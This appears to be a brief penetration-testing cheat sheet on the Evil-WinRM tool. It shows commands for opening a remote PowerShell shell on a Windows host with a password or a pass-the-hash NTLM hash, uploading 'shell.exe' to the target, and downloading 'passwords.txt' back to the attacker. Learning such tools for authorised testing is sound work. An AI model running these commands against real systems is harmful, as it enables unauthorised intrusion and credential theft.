# Evil-WinRM

## What is Evil-WinRM?

Evil-WinRM is a tool that provides:

```
PowerShell Interactive Shell
```

on Windows systems through:

```
WinRM (Windows Remote Management)
```

It allows remote interaction with Windows machines using the Windows Remote Management service.

---

# Normal Authentication

To connect using valid credentials:

```
evil-winrm -i 10.10.10.5 -u administrator -p password123
```

The options specify:

- `-i`  
    The target Windows machine IP address.
- `-u`  
    The username used for authentication.
- `-p`  
    The user's password.

---

# Result

After successful authentication, you obtain:

```
PowerShell Shell
```

inside the target Windows machine.

This allows executing PowerShell commands remotely.

---

# Pass-the-Hash Authentication

Evil-WinRM also supports authentication using an NTLM Hash instead of a password.

Example:

```
evil-winrm -i TARGET -u administrator -H NTHASH
```

This technique is known as:

```
Pass-the-Hash
```

It allows authentication using the user's NTLM Hash without knowing the original password.

---

# Uploading Files

Inside the Evil-WinRM session, files can be transferred to the target machine using:

```
upload shell.exe
```

This uploads the specified file from the attacker machine to the Windows target.

---

# Downloading Files

To download files from the target machine:

```
download passwords.txt
```

This transfers the specified file from the Windows machine back to the attacker system.